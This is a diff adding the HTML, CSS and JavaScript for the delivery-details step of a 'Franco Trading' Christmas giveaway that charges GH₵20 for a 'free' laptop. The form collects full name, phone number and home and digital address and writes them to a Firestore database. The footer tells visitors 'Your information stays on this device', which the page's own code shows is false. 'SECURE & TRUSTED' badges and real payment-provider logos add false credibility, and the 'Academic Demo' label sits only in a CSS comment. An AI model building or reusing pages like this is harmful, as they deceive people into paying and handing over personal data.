@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Delivery Details — Franco Trading</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link
+    href="https://fonts.googleapis.com/css2?family=Fraunces:ital,wght@0,500;0,600;1,500&family=Manrope:wght@500;600;700;800&display=swap"
+    rel="stylesheet">
+  <style>
+    /* ===========================================================
+   Franco Trading — Christmas Giveaway (Academic Demo)
+   =========================================================== */
+
+    :root {
+      --navy-deep: #0b1a3d;
+      --navy: #0f2152;
+      --navy-light: #1a2f68;
+      --gold: #f4b740;
+      --gold-light: #ffd97a;
+      --cream: #fdf6e8;
+      --ink: #10162b;
+      --muted: #6b7390;
+      --line: #e4e7f1;
+      --success: #2e9e5b;
+      --danger: #d8475f;
+
+      --font-display: 'Fraunces', serif;
+      --font-body: 'Manrope', sans-serif;
+
+      --radius-lg: 18px;
+      --radius-md: 12px;
+      --radius-sm: 8px;
+
+      --shadow-soft: 0 16px 40px rgba(11, 26, 61, 0.14);
+      --shadow-card: 0 6px 18px rgba(11, 26, 61, 0.08);
+    }
+
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      height: auto;
+    }
+
+    body {
+      margin: 0;
+      font-family: var(--font-body);
+      color: var(--ink);
+      background: var(--cream);
+      -webkit-font-smoothing: antialiased;
+      line-height: 1.5;
+    }
+
+    img {
+      max-width: 100%;
+      display: block;
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    button {
+      font-family: inherit;
+      cursor: pointer;
+    }
+
+    input,
+    select,
+    textarea {
+      font-family: inherit;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1140px;
+      margin: 0 auto;
+      padding: 0 24px;
+    }
+
+    /* ---------- Top banner ---------- */
+    .demo-banner {
+      background: var(--navy-deep);
+      color: var(--gold-light);
+      text-align: center;
+      font-size: 0.8rem;
+      padding: 7px 16px;
+      letter-spacing: .01em;
+    }
+
+    .demo-banner strong {
+      color: #fff;
+    }
+
+    /* ---------- Header ---------- */
+    .site-header {
+      background: var(--navy);
+      color: #fff;
+      padding: 16px 0;
+    }
+
+    .site-header .container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 800;
+      font-size: 1.05rem;
+      letter-spacing: .01em;
+      color: #fff;
+    }
+
+    .brand .mark {
+      width: 34px;
+      height: 34px;
+      border-radius: 9px;
+      background: linear-gradient(135deg, var(--gold), #e08a2e);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--navy-deep);
+      font-family: var(--font-display);
+      font-weight: 700;
+      font-size: 1.1rem;
+    }
+
+    .brand .name small {
+      display: block;
+      font-weight: 600;
+      font-size: 0.62rem;
+      letter-spacing: .14em;
+      color: var(--gold-light);
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 26px;
+      font-size: 0.92rem;
+      font-weight: 600;
+    }
+
+    .nav-links a {
+      color: rgba(255, 255, 255, 0.78);
+    }
+
+    .nav-links a.active {
+      color: var(--gold-light);
+    }
+
+    .trust-chip {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.78rem;
+      font-weight: 700;
+      color: var(--gold-light);
+      white-space: nowrap;
+    }
+
+    @media (max-width: 760px) {
+      .nav-links {
+        display: none;
+      }
+    }
+
+    /* ---------- Section (teaser body) ---------- */
+    .section {
+      padding: 60px 0;
+    }
+
+    .section-head {
+      text-align: center;
+      max-width: 560px;
+      margin: 0 auto 36px;
+    }
+
+    .section-head .kicker {
+      color: var(--gold);
+      background: #fff3dc;
+      display: inline-block;
+      padding: 5px 12px;
+      border-radius: 999px;
+      font-weight: 800;
+      font-size: 0.75rem;
+      margin-bottom: 12px;
+    }
+
+    .section-head h2 {
+      font-family: var(--font-display);
+      font-weight: 600;
+      font-size: clamp(1.6rem, 3vw, 2.1rem);
+      margin: 0 0 10px;
+      color: var(--navy-deep);
+    }
+
+    .section-head p {
+      color: var(--muted);
+      margin: 0;
+    }
+
+    .festive-strip {
+      background: var(--navy-deep);
+      line-height: 0;
+      padding-bottom: 6px;
+    }
+
+    /* ---------- Stepper ---------- */
+    .stepper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 22px 0 8px;
+    }
+
+    .stepper .step {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--muted);
+    }
+
+    .stepper .circ {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #fff;
+      border: 2px solid var(--line);
+      font-size: 0.82rem;
+    }
+
+    .stepper .step.done .circ {
+      background: var(--success);
+      border-color: var(--success);
+      color: #fff;
+    }
+
+    .stepper .step.current .circ {
+      background: var(--navy-deep);
+      border-color: var(--navy-deep);
+      color: #fff;
+    }
+
+    .stepper .step.current {
+      color: var(--navy-deep);
+    }
+
+    .stepper .bar {
+      width: 48px;
+      height: 2px;
+      background: var(--line);
+    }
+
+    @media (max-width:560px) {
+      .stepper .step span.label {
+        display: none;
+      }
+
+      .stepper .bar {
+        width: 24px;
+      }
+    }
+
+    /* page body with cream bg for non-hero pages */
+    .page-body {
+      background: var(--cream);
+      min-height: 60vh;
+      padding: 28px 0 60px;
+    }
+
+    .layout-two {
+      display: grid;
+      grid-template-columns: 0.9fr 1.1fr;
+      gap: 24px;
+      align-items: start;
+    }
+
+    @media (max-width: 860px) {
+      .layout-two {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .panel {
+      background: #fff;
+      border: 1px solid var(--line);
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-card);
+      overflow: hidden;
+    }
+
+    .panel-head {
+      background: var(--navy-deep);
+      color: #fff;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 800;
+      font-size: 0.95rem;
+    }
+
+    .panel-body {
+      padding: 20px;
+    }
+
+    .selected-gift {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .selected-gift .art {
+      width: 92px;
+      height: 92px;
+      background:
+        radial-gradient(circle at 50% 35%, rgba(244, 183, 64, 0.22), transparent 60%),
+        linear-gradient(160deg, #101f4c, #1a2f68 70%);
+      border-radius: var(--radius-md);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .selected-gift .art img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: var(--radius-md);
+    }
+
+    .selected-gift h3 {
+      margin: 0 0 4px;
+      font-size: 1.05rem;
+      color: var(--navy-deep);
+    }
+
+    .selected-gift .was {
+      font-size: 0.85rem;
+      color: var(--muted);
+      text-decoration: line-through;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 0;
+      font-size: 0.92rem;
+      border-bottom: 1px dashed var(--line);
+    }
+
+    .summary-row:last-of-type {
+      border-bottom: none;
+    }
+
+    .summary-row .k {
+      color: var(--muted);
+    }
+
+    .summary-row .v {
+      font-weight: 700;
+    }
+
+    .summary-total {
+      display: flex;
+      justify-content: space-between;
+      align-items: baseline;
+      margin-top: 10px;
+      padding-top: 14px;
+      border-top: 2px solid var(--navy-deep);
+    }
+
+    .summary-total .k {
+      font-weight: 800;
+      color: var(--navy-deep);
+    }
+
+    .summary-total .v {
+      font-family: var(--font-display);
+      font-size: 1.7rem;
+      font-weight: 600;
+      color: var(--navy-deep);
+    }
+
+    .pay-methods {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 14px;
+      align-items: flex-start;
+    }
+
+    .payment-logos {
+      display: flex;
+      flex-direction: row;
+      align-items: center;
+      flex-wrap: nowrap;
+      gap: 12px;
+      width: 100%;
+    }
+
+    .payment-logo {
+      display: block;
+      flex: 0 0 120px;
+      width: 120px;
+      max-width: 120px;
+      height: 30px;
+      object-fit: contain;
+      object-position: center;
+    }
+
+    @media (max-width: 420px) {
+      .payment-logos {
+        gap: 8px;
+      }
+
+      .payment-logo {
+        flex-basis: 104px;
+        width: 104px;
+        max-width: 104px;
+        height: 26px;
+      }
+    }
+
+    /* ---------- Forms ---------- */
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    @media (max-width:560px) {
+      .form-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .field {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .field.full {
+      grid-column: 1 / -1;
+    }
+
+    .field label {
+      font-size: 0.82rem;
+      font-weight: 700;
+      color: var(--navy-deep);
+    }
+
+    .field label .opt {
+      color: var(--muted);
+      font-weight: 600;
+    }
+
+    .field input,
+    .field select,
+    .field textarea {
+      border: 1.5px solid var(--line);
+      border-radius: var(--radius-sm);
+      padding: 11px 13px;
+      font-size: 0.94rem;
+      color: var(--ink);
+      background: #fcfcfe;
+      transition: border-color .15s ease, box-shadow .15s ease;
+    }
+
+    .field input:focus,
+    .field select:focus,
+    .field textarea:focus {
+      outline: none;
+      border-color: var(--navy-deep);
+      box-shadow: 0 0 0 3px rgba(15, 33, 82, 0.1);
+    }
+
+    .field .error {
+      font-size: 0.76rem;
+      color: var(--danger);
+      min-height: 1em;
+    }
+
+    .field.has-error input,
+    .field.has-error select {
+      border-color: var(--danger);
+    }
+
+    .safe-note {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      background: #eef9f1;
+      border: 1px solid #cdeedb;
+      color: #1d6b3f;
+      font-size: 0.83rem;
+      font-weight: 600;
+      padding: 12px 14px;
+      border-radius: var(--radius-sm);
+      margin-top: 16px;
+    }
+
+    .safe-note svg {
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* ---------- Footer ---------- */
+    .site-footer {
+      background: var(--navy-deep);
+      color: rgba(255, 255, 255, 0.65);
+      padding: 40px 0 22px;
+      font-size: 0.86rem;
+    }
+
+    .footer-grid {
+      display: grid;
+      grid-template-columns: 1.4fr 1fr 1fr 1.2fr;
+      gap: 28px;
+      padding-bottom: 26px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    @media (max-width:760px) {
+      .footer-grid {
+        grid-template-columns: 1fr 1fr;
+      }
+    }
+
+    .footer-grid h4 {
+      color: #fff;
+      font-size: 0.82rem;
+      letter-spacing: .03em;
+      margin: 0 0 14px;
+    }
+
+    .footer-grid ul {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      gap: 9px;
+    }
+
+    .footer-grid a:hover {
+      color: var(--gold-light);
+    }
+
+    .footer-note {
+      padding-top: 18px;
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 10px;
+      font-size: 0.78rem;
+    }
+
+    .footer-safety {
+      margin-top: 4px;
+      color: var(--gold-light);
+      font-weight: 600;
+    }
+
+    /* visually hidden util */
+    .sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
+    }
+
+    :focus-visible {
+      outline: 3px solid var(--navy-light);
+      outline-offset: 2px;
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      * {
+        animation-duration: 0.001ms !important;
+        transition-duration: 0.001ms !important;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <header class="site-header">
+    <div class="container">
+      <div class="brand">
+        <span class="mark" aria-hidden="true">F</span>
+        <span class="name">FRANCO TRADING ENTERPRISE<small>SECURE &amp; TRUSTED</small></span>
+      </div>
+      <nav class="nav-links" aria-label="Primary navigation">
+        <a href="index.html">Home</a>
+        <a href="items.html" class="active">Giveaway</a>
+        <a href="index.html#faqs">FAQs</a>
+        <a href="index.html#contact">Contact</a>
+      </nav>
+    </div>
+  </header>
+  <div class="festive-strip" id="lights-strip"></div>
+
+  <div class="stepper">
+    <div class="step done"><span class="circ"><svg width="12" height="12" viewBox="0 0 24 24" fill="none"
+          stroke="currentColor" stroke-width="3">
+          <path d="M5 13l4 4L19 7" />
+        </svg></span><span class="label">Select Gift</span></div>
+    <div class="bar"></div>
+    <div class="step current"><span class="circ">2</span><span class="label">Delivery Details</span></div>
+    <div class="bar"></div>
+    <div class="step"><span class="circ">3</span><span class="label">Payment</span></div>
+  </div>
+
+  <main class="page-body">
+    <div class="container">
+      <div class="layout-two">
+
+        <!-- left column: gift + summary -->
+        <div style="display:flex;flex-direction:column;gap:18px;">
+          <div class="panel">
+            <div class="panel-head">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="8" width="18" height="13" rx="2" />
+                <path d="M3 8l9-5 9 5M12 3v5" />
+              </svg>
+              Your Selected Gift
+            </div>
+            <div class="panel-body">
+              <div class="selected-gift" id="gift-box"><!-- filled by JS --></div>
+            </div>
+          </div>
+
+          <div class="panel">
+            <div class="panel-head">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="2" y="6" width="20" height="13" rx="2" />
+                <path d="M2 10h20" />
+              </svg>
+              Payment Summary
+            </div>
+            <div class="panel-body">
+              <div class="summary-row"><span class="k">Giveaway price</span><span class="v">GH₵20.00</span></div>
+              <div class="summary-total"><span class="k">Total due</span><span class="v">GH₵20.00</span></div>
+              <div class="pay-methods">
+                <span style="font-size:0.78rem;color:var(--muted);font-weight:700;">Pay securely with:</span>
+                <span class="payment-logos" aria-label="Available payment providers">
+                  <img class="payment-logo" src="https://expresspaygh.com/img/logo.png" alt="ExpressPay">
+                  <img class="payment-logo" src="https://hubtel.com/_nuxt/hubtel-primary-logo.DE_lS_hk.svg" alt="Hubtel">
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- right column: delivery form -->
+        <div class="panel">
+          <div class="panel-head">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <rect x="3" y="7" width="18" height="13" rx="2" />
+              <path d="M3 10h18" />
+            </svg>
+            Delivery Details
+          </div>
+          <div class="panel-body">
+            <p style="margin:0 0 18px;color:var(--muted);font-size:0.9rem;">Please provide your correct delivery
+              information to receive your gift.</p>
+
+            <form id="delivery-form" novalidate>
+              <div class="form-grid">
+                <div class="field full" data-field="fullName">
+                  <label for="fullName">Full name</label>
+                  <input type="text" id="fullName" placeholder="Enter your full name" autocomplete="name">
+                  <div class="error"></div>
+                </div>
+
+                <div class="field" data-field="phone">
+                  <label for="phone">Phone number</label>
+                  <input type="tel" id="phone" placeholder="Enter your mobile number" autocomplete="tel">
+                  <div class="error"></div>
+                </div>
+
+                <div class="field" data-field="region">
+                  <label for="region">Region</label>
+                  <select id="region">
+                    <option value="">Select your region</option>
+                    <option>Greater Accra</option>
+                    <option>Ashanti</option>
+                    <option>Western</option>
+                    <option>Eastern</option>
+                    <option>Central</option>
+                    <option>Volta</option>
+                    <option>Northern</option>
+                    <option>Bono</option>
+                    <option>Other</option>
+                  </select>
+                  <div class="error"></div>
+                </div>
+
+                <div class="field" data-field="city">
+                  <label for="city">City / Town</label>
+                  <input type="text" id="city" placeholder="Enter your city or town">
+                  <div class="error"></div>
+                </div>
+
+                <div class="field" data-field="digitalAddress">
+                  <label for="digitalAddress">Digital address</label>
+                  <input type="text" id="digitalAddress" placeholder="e.g. GA-183-9921">
+                  <div class="error"></div>
+                </div>
+
+                <div class="field full" data-field="homeAddress">
+                  <label for="homeAddress">Home address</label>
+                  <input type="text" id="homeAddress" placeholder="Enter your house address">
+                  <div class="error"></div>
+                </div>
+
+                <div class="field full">
+                  <label for="instructions">Delivery instructions <span class="opt">(optional)</span></label>
+                  <textarea id="instructions" rows="2" placeholder="Any special instructions?"></textarea>
+                </div>
+              </div>
+
+              <button type="submit" class="btn btn-primary btn-block" style="margin-top:20px;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4">
+                  <rect x="5" y="11" width="14" height="9" rx="2" />
+                  <path d="M8 11V8a4 4 0 018 0v3" />
+                </svg>
+                Submit &amp; Pay GH₵20.00
+              </button>
+
+              <div class="safe-note">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6l8-4z" />
+                </svg>
+                Your information is safe and secure. Franco Trading will never ask for your card PIN or password over
+                the phone.
+              </div>
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-note">
+        <span>© 2026 Franco Trading Enterprise.</span>
+        <span class="footer-safety">Your information stays on this device.</span>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    /* ===========================================================
+       Franco Trading — shared state helpers
+       =========================================================== */
+
+    const FrancoState = {
+      key: "franco_demo_state",
+      get() {
+        try {
+          return JSON.parse(sessionStorage.getItem(this.key)) || {};
+        } catch (e) { return {}; }
+      },
+      set(patch) {
+        const current = this.get();
+        const next = Object.assign({}, current, patch);
+        sessionStorage.setItem(this.key, JSON.stringify(next));
+        return next;
+      }
+    };
+
+    // Fallback in case products data is missing so it doesn't crash the script
+    window.PRODUCTS = window.PRODUCTS || [
+      { id: "laptop", name: "HP Laptop", was: "GH₵3500", image: "" }
+    ];
+
+    function getProductById(id) {
+      return window.PRODUCTS.find(p => p.id === id) || window.PRODUCTS[0]; // Always return at least a fallback
+    }
+  </script>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyB0oJPcnr8ij_AUCRrGSs2Pf7DWjSl_ZNc",
+      authDomain: "francotrading-11fa5.firebaseapp.com",
+      projectId: "francotrading-11fa5",
+      storageBucket: "francotrading-11fa5.firebasestorage.app",
+      messagingSenderId: "583238316249",
+      appId: "1:583238316249:web:65dc5f6dd27503b6facec8",
+      measurementId: "G-2X0W0EZVGF"
+    };
+
+    const firebaseApp = initializeApp(firebaseConfig);
+    const db = getFirestore(firebaseApp);
+
+    window.getSessionId = function () {
+      let id = sessionStorage.getItem("franco_session_id");
+      if (!id) {
+        id = "usr_" + Date.now() + "_" + Math.random().toString(36).slice(2, 7);
+        sessionStorage.setItem("franco_session_id", id);
+      }
+      return id;
+    };
+
+    // Load the product
+    const state = FrancoState.get();
+    const product = getProductById(state.productId);
+
+    // Inject product into the DOM
+    document.getElementById("gift-box").innerHTML = `
+    <div class="art"><img src="${product.image}" alt="${product.name}"></div>
+    <div>
+      <h3>${product.name}</h3>
+      <span class="was">${product.was}</span>
+    </div>
+  `;
+
+    // Handle form submission
+    const form = document.getElementById("delivery-form");
+    const required = ["fullName", "phone", "region", "city", "digitalAddress", "homeAddress"];
+
+    function showError(id, msg) {
+      const field = document.querySelector(`[data-field="${id}"]`);
+      field.classList.toggle("has-error", !!msg);
+      field.querySelector(".error").textContent = msg || "";
+    }
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault(); // This stops the page from refreshing
+      
+      let valid = true;
+      required.forEach(id => {
+        const el = document.getElementById(id);
+        if (!el.value.trim()) {
+          showError(id, "This field is required");
+          valid = false;
+        } else {
+          showError(id, "");
+        }
+      });
+
+      const phoneVal = document.getElementById("phone").value.trim();
+      if (phoneVal && phoneVal.replace(/\D/g, "").length < 9) {
+        showError("phone", "Enter a valid phone number");
+        valid = false;
+      }
+
+      if (!valid) return;
+
+      const delivery = {
+        fullName: document.getElementById("fullName").value.trim(),
+        phone: phoneVal,
+        region: document.getElementById("region").value,
+        city: document.getElementById("city").value.trim(),
+        digitalAddress: document.getElementById("digitalAddress").value.trim(),
+        homeAddress: document.getElementById("homeAddress").value.trim(),
+        instructions: document.getElementById("instructions").value.trim()
+      };
+
+      const submitButton = form.querySelector('button[type="submit"]');
+      submitButton.disabled = true;
+      const originalButtonText = submitButton.lastChild;
+      if (originalButtonText) originalButtonText.textContent = " Submitting…";
+
+      try {
+        const sessionId = window.getSessionId();
+        await setDoc(doc(db, "deliverySubmissions", sessionId), {
+          sessionId,
+          productId: product.id,
+          productName: product.name,
+          delivery,
+          submittedAt: serverTimestamp()
+        });
+
+        FrancoState.set({ delivery });
+        window.location.href = "payment.html"; // Go to payment page
+      } catch (error) {
+        console.error("Could not save delivery details to Firestore:", error);
+        submitButton.disabled = false;
+        if (originalButtonText) originalButtonText.textContent = " Submit & Pay GH₵20.00";
+        const errorCode = error && error.code ? error.code : "unknown-error";
+        const errorMessage = error && error.message ? error.message : String(error);
+        alert(`Firestore error (${errorCode}): ${errorMessage}`);
+      }
+    });
+  </script>
+</body>
+
+</html>
